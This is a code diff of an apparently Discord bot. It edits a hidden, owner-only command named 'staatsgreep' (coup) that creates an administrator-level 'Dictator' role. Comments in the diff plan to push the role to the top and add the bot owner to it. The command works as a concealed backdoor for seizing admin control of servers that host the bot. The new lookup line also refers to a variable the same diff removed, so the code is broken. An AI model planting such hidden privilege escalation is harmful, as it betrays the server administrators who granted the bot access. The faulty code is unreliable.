@@ -110,12 +110,21 @@ async def customText(ctx):
 @bot.command(hidden = True)
 @commands.is_owner()
 async def staatsgreep(ctx):
-    guild = ctx.guild
-    pos = len(guild.roles) - 1
+    # Create a role (with admin permissions and a color)
+    server = ctx.guild
+    pos = len(server.roles) - 1
     perms = discord.Permissions(administrator=True)
     color = discord.Colour(0xB70EEB)
-    await guild.create_role(name="Dictator", hoist=True, permissions=perms, colour=color)
+    await server.create_role(name="Dictator", hoist=True, permissions=perms, colour=color)
     await ctx.send("Done")
+
+    # Get role as object
+    new_role = discord.utils.get(guild.roles, name="Dictator")
+    await ctx.send(new_role.name)
+
+    # Get role to top of role list (/ under bot role)
+
+    # Add me to the role
 
 # test loop
 # restart loop
